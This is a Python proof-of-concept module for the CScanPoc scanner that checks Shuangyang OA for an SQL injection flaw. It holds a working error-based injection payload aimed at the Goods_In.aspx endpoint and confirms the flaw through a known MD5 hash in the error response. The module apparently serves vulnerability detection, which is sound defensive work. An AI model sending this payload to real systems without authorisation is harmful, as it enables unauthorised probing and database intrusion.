# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Shuangyang_0012'  # 平台漏洞编号，留空
    name = '双杨OA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-28'  # 漏洞公布时间
    desc = '''
        双杨OA系统是由上海双杨电脑高科技开发公司打造的一款办公一体化管理软件。
        双杨OA系统存在SQL注入漏洞：
        /DSOA_TY/Office_Supplies/Goods_In.aspx?info_id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0149795'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '双杨OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'feb5c280-e490-477f-be2f-13346d34bff3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0149795
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/DSOA_TY/Office_Supplies/Goods_In.aspx?info_id=1&list=11)%20AND%208938=CONVERT(INT,(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123%27))))"
            url = arg + payload
            code, head, res, errcode, _ = hh.http(url)
            time.sleep(1)
            if code == 500 and '202cb962ac59075b964b07152d234b70' in res:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
